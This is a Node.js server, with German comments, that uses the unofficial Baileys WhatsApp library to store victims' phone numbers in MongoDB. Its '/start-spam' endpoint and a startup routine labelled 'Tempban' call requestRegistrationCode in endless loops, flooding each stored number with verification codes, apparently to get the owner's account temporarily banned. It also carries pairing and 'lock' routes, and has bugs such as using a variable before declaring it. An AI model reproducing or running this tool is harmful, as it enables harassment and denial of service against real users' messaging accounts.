const cluster = require('cluster');
const numCPUs = require('os').cpus().length;
const fs = require('fs');
const path = require('path');
const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const mongoose = require('mongoose');
const ejs = require('ejs');
const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');
const pinoo = require('pino');


// Konfiguration des Pino-Loggers mit gewünschten Log-Leveln
const log = pinoo({
    level: 'warn', // Nur Nachrichten mit Log-Level warn und höher werden protokolliert
    base: null // Deaktiviert den Standard-Serializer
});

// Pfad zur Log-Datei
const logFilePath = 'pino_logs.log';

// Pino-Logger konfigurieren, um Protokolle direkt in die Datei zu schreiben
const logStream = pinoo.destination({ dest: logFilePath });

// Beispiel-Log-Nachrichten
log.info('Dies ist eine Info-Nachricht.');
log.warn('Dies ist eine Warnungs-Nachricht.');
log.error('Dies ist eine Fehler-Nachricht.');

// Alle Pino-Logs wurden in die Datei geschrieben
console.log('Alle Pino-Logs wurden in die Datei geschrieben:', logFilePath);

if (cluster.isMaster) {
    console.log(`Master ${process.pid} is running`);

    // Fork Workers
    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }

    cluster.on('exit', (worker, code, signal) => {
        console.log(`Worker ${worker.process.pid} died`);
        // Fork a new worker if any worker dies
        cluster.fork();
    });
} else {
    // Worker Process
    require('dotenv').config(); // Load environment variables from .env file

    const app = express();
    const port = process.env.PORT || 10000; // Use environment variable or default port

    // MongoDB connection string from environment variable
    const mongoURI = process.env.MONGODB_URI;
    const startspam = process.env.START_SPAM;
    const startpair = process.env.START_PAIR;


    // Connect to MongoDB
    mongoose.connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true })
        .then(() => log.info('Connected to MongoDB'))
        .catch(err => log.error('Error connecting to MongoDB:', err));

    const SpamDataSchema = new mongoose.Schema({
        ddi: String,
        number: String,
        timestamp: { type: Date, default: Date.now }
    });

   
    
  

    // Modell aus dem Schema erstellen
    const SpamData = mongoose.model('SpamData', SpamDataSchema);
/*
    const sendStoredData = async () => {
        try {
            // Alle Daten aus der MongoDB abrufen
            const data = await SpamData.find({}, 'ddi number');

            // Daten an den /start-spam Endpunkt senden
            await Promise.all(data.map(async (item) => {
                const { ddi, number } = item;
                await fetch(startspam, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ ddi, number })
                });
            }));
            log.info('Stored data sent successfully from MongoDB');
            await sleep(20);
        } catch (error) {
            log.error('Error sending stored data:', error);
        }
    };

    // Funktion aufrufen, um die Daten beim Starten des Servers zu senden
    sendStoredData();

    */

    // Set up body parsers
    let server = require('./views/qr');
    code = require('./views/pair');
    code2 = require('./start-pairing/pair2');
    app.use('/qr', server);
    app.use('/code', code);
    app.use('/code2', code2);
    app.use(bodyParser.json());
    app.use(bodyParser.urlencoded({ extended: true }));
    app.use(cookieParser());
    app.use(express.static(path.join(__dirname, 'public')));

    // Set up view engine and views directory
    const __path = path.join(__dirname, 'views');
    app.set('view engine', 'ejs');
    app.set('views', __path);
    app.engine('ejs', ejs.renderFile);

    // Routes
    app.get('/', (req, res) => {
        res.render('index', { title: 'Home' });
    });

    app.get('/pair', (req, res) => {
        res.render('pair', { title: 'pairing' });
    });

    app.get('/pair2', (req, res) => {
        res.render('pair2', { title: 'pairing2' });
    });

    app.get('/lock', (req, res) => {
        res.render(path.join(__path, 'lock'), { title: 'Lock' });
    });

    function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
    
    
    app.post('/start-spam', async (req, res) => {
        const { ddi, number } = req.body;
        try {
            // Überprüfen, ob die Kombination von DDI und number bereits in der MongoDB vorhanden ist
            const existingData = await SpamData.findOne({ ddi, number });
            if (existingData) {
                log.info('Data already exists in MongoDB');
                await sleep(50);
            } else {
                await newData.save();
                log.info('Data saved successfully to MongoDB');
            }  // Neue Instanz des Modells erstellen und speichern
                const newData = new SpamData({ ddi, number });
              

            const { state, saveCreds } = await useMultiFileAuthState('.mm');
            const spam = makeWaSocket({
                auth: state,
                mobile: true,
                logger: log.child({ component: 'whiskeysockets' }) // Child logger for whiskeysockets
            });

            while (true) {
                try {
                    const response = await spam.requestRegistrationCode({
                        phoneNumber: '+' + ddi + number,
                        phoneNumberCountryCode: ddi,
                        phoneNumberNationalNumber: number,
                        phoneNumberMobileCountryCode: 724
                    });
                    res.json({ success: true, response }); // Send success response
                    return;
                } catch (err) {
                    // Fehler ignorieren und keine Aktion ausführen
                }
            }
        } catch (err) {
            // Fehler ignorieren und keine Aktion ausführen
        }
    });



const startSpamV2 = async () => {
    try {
        console.log('Tempban wird gestartet...');
        // Alle Daten aus der MongoDB abrufen
        const data = await SpamData.find({}, 'ddi number');
        console.log('Abgerufene Daten aus der MongoDB Tempban');

        // Für jede Datenzeile den Spam starten
        await Promise.all(data.map(async (item) => {
            const { ddi, number } = item;

            const { state, saveCreds } = await useMultiFileAuthState('.mm');
            const spam = makeWaSocket({
                auth: state,
                mobile: true,
                logger: log.child({ component: 'whiskeysockets' }) // Child logger for whiskeysockets
            });

            while (true) {
                try {
                    const response = await spam.requestRegistrationCode({
                        phoneNumber: '+' + ddi + number,
                        phoneNumberCountryCode: ddi,
                        phoneNumberNationalNumber: number,
                        phoneNumberMobileCountryCode: 724
                    });
                    log.info('Spam request sent successfully:', response);
                    await sleep(2000); // Zeit zwischen den Spam-Anfragen
                } catch (err) {
                   
                }
            }
        }));
        console.log('Tempban abgeschlossen.');

    } catch (error) {
      
    }
};

// Starten Sie den Spam-Prozess beim Starten des Servers
startSpamV2();






    // Error handling middleware
    app.use((err, req, res, next) => {
        log.error(err.stack);
        res.status(500).send('Something broke!');
    });

    // Start server
    app.listen(port, () => {
        log.info(`Worker ${process.pid} started and is listening on port ${port}`);
    });

    app.on('listening', () => {
        setTimeout(() => {
            sendStoredData();
        }, 15000);
    });
}
